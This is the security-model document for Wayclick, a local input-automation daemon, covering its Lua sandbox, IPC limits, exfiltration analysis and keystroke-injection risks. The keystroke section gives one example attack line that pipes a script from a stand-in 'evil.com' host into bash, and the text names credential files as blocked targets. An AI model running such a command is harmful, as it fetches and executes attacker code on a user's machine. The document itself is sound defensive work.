# Security Model

## Threat Model

Wayclick is a local-only automation daemon. It does **not**:

- Listen on network interfaces
- Accept remote connections
- Execute arbitrary commands from config (Lua sandbox prevents this)
- Store or transmit credentials

### Attack Surface

| Surface                  | Mitigation                                         |
|--------------------------|----------------------------------------------------|
| Lua config execution     | Sandboxed VM: `os.execute`, `io.popen`, `load`, `loadfile`, `dofile`, `debug.*` removed. `io.open` restricted to config directory, read-only. |
| IPC socket               | Unix domain socket with `0600` permissions. Only the owning user can connect. |
| `/dev/uinput` access     | Controlled via the `wayclick` group and udev rules. |
| `/dev/input` access      | Standard `input` group membership.                 |
| Config hot-reload        | Only reloads from the configured Lua path. Validates before applying. |
| IPC frame parsing        | Maximum frame size enforced (64KB). JSON-RPC validation. Fuzz-tested. |

### Lua Sandbox Details

The following functions are **removed** from the Lua global environment:

- `os.execute` — shell command execution
- `os.exit` — process termination
- `io.popen` — pipe to shell command
- `load` — load arbitrary Lua code from strings
- `loadfile` — load Lua code from arbitrary files
- `dofile` — execute Lua code from arbitrary files
- `debug.*` — entire debug table

Additionally:

- `io.open` is replaced with a wrapper that **only allows read mode** and **only permits access to files within the config directory** (`~/.config/wayclick/`). Paths are canonicalized to prevent symlink and `../` traversal attacks.
- `package.path` is restricted to the config's `lua/` subdirectory
- `package.cpath` is cleared — no native C modules can be loaded
- `require()` can only load modules from the config directory

### Data Exfiltration Analysis

Even if a Lua config could read sensitive files, there is **no exfiltration channel**:

| Channel              | Status   | Notes                                                    |
|----------------------|----------|----------------------------------------------------------|
| Network sockets      | Blocked  | Standard Lua 5.4 has no socket/HTTP library. `package.cpath = ""` prevents loading LuaSocket or any native C module. |
| Shell commands        | Blocked  | `os.execute` and `io.popen` are nil.                     |
| File writes           | Blocked  | `io.open` rejects write and append modes.                |
| Dynamic code loading  | Blocked  | `load`, `loadfile`, `dofile` are nil.                    |
| Encoding into actions | Mitigated | Lua *can* build `key_press` sequences dynamically at config-load time. However, `io.open` is restricted to the config directory — no sensitive data is available to encode. See [Keystroke Injection](#keystroke-injection-and-untrusted-configs) below. |

With `io.open` now restricted to the config directory, this is defense-in-depth: even if an exfiltration channel were discovered, the readable file set is limited to the user's own config files.

### Keystroke Injection and Untrusted Configs

> **⚠️ Never load a wayclick config from an untrusted source without reviewing it first.** This is the same guidance that applies to shell scripts, AutoHotkey scripts, VS Code extensions, and any other tool that can automate input.

Wayclick's core purpose is keystroke and mouse injection. A malicious config could use `key_press` + `sequence` to type arbitrary pre-baked commands (e.g., `curl https://evil.com/backdoor.sh | bash`) when the user presses a bound button — just as any AHK script or shell alias could do.

**Why this is an inherent capability, not a bug:**

- Input injection is the tool's stated purpose
- Removing it would make the tool non-functional
- Every input automation tool (AutoHotkey, xdotool, xbindkeys, etc.) has this same property

**Why data exfiltration via keystrokes is not viable:**

A more sophisticated attack would attempt to read sensitive files, encode their contents into keystrokes, and type them into a `curl` command in a terminal. This is blocked by defense-in-depth:

1. **`io.open` is restricted to the config directory** — an attacker cannot read `~/.ssh/id_rsa`, `/etc/shadow`, or any file outside `~/.config/wayclick/`. The only readable files are the attacker's own config.
2. **No automatic terminal detection** — profile rules (`match_app`) are defined in the config schema but are not implemented in the engine. A config cannot auto-detect when a terminal emulator is focused.
3. **Requires explicit user interaction** — all actions require the user to press a specific bound button. There is no auto-fire-on-load mechanism.
4. **No network access** — Lua cannot make HTTP requests, open sockets, or execute shell commands.

**Defense-in-depth summary:**

| Layer | Protection |
|-------|-----------|
| Data collection | `io.open` restricted to config directory |
| Data encoding | Keystroke sequences can only contain static, pre-baked content |
| Trigger mechanism | Requires physical button press by the user |
| Terminal detection | Profile rules not implemented in engine |
| Network egress | No sockets, no HTTP, no shell in Lua sandbox |

### Keylogging Considerations

Wayclick can bind keyboard events (`KEY_*` codes) on specific input devices. With debug logging enabled, each key press produces a log entry like:

```
Button KEY_A pressed, firing trigger 'my_trigger'
```

**Why this is not a vulnerability:**

- Only the user's own devices can be monitored (no privilege escalation)
- Only devices matching explicit `bind_device` rules are monitored — nothing is captured by default
- Logs contain key code names (`KEY_A`), not composed characters or passwords
- The log is an in-memory ring buffer (default 100 entries), accessible only via the user's own IPC socket
- Under systemd, log output goes to the user journal (readable only by the same user)
- There is no way to transmit captured data off-machine from Lua (see exfiltration analysis above)

This is a "user configures their own keylogger" scenario — equivalent to running `evtest` on your own input device. The same user who writes the config is the one whose input gets logged.

**Recommendation:** Avoid binding keyboard triggers with debug-level logging in shared environments. Default log level (`info`) does not include per-key-press messages.

### IPC Security

- The IPC socket is created with mode `0600` (user read/write only)
- Located in `$XDG_RUNTIME_DIR` (typically `/run/user/<uid>/`)
- JSON-RPC frames are limited to 64KB maximum
- Concurrent connections capped at 32 (prevents connection flood DoS)
- Unknown methods return an error; they do not execute anything

### Resource Exhaustion Protections

Wayclick enforces hard limits to prevent accidental or malicious resource exhaustion:

| Protection | Limit | Rationale |
|------------|-------|-----------|
| Lua instruction count | 10,000,000 | Prevents infinite loops during config loading (~2-3 seconds of Lua execution) |
| Action nesting depth | 32 levels | Prevents stack overflow from deeply nested sequence/parallel trees |
| Parallel sub-actions | 64 per composite | Prevents thread explosion from spawning too many concurrent threads |
| IPC concurrent clients | 32 connections | Prevents connection flood attacks from exhausting system threads |
| systemd MemoryMax | 256MB | Prevents unbounded memory consumption |
| systemd TasksMax | 128 threads | Prevents thread explosion at the OS level |
| systemd CPUQuota | 50% | Prevents CPU starvation of other applications |
| Minimum click interval | 1ms (configurable) | Prevents tight CPU loops from auto-click actions |

**Design decision:** All safety limits are compile-time constants, not user-configurable. They are generous enough for any practical config but prevent catastrophic resource exhaustion.

**What is NOT possible from a Lua config:**

- ❌ Fork bombs — `os.execute` is nil, no process spawning
- ❌ Network access — no sockets, no HTTP, no DNS
- ❌ Infinite loops blocking startup — instruction count hook aborts after 10M instructions
- ❌ Stack overflow from nested actions — depth capped at 32
- ❌ Thread explosion from parallel actions — capped at 64 sub-actions per composite

## Recommendations

1. **Never run untrusted configs.** Always review Lua configs before loading them — treat them like shell scripts.
2. **Do not run as root.** Use the systemd user service.
3. **Audit your Lua config** before sharing it with others.
4. **Keep wayclick updated** to receive security fixes.
5. Use `wayclickd --check-permissions` to verify minimal access.

## Reporting Vulnerabilities

If you discover a security issue, please report it via GitHub Security
Advisories (preferred) or by email. Do not open a public issue.
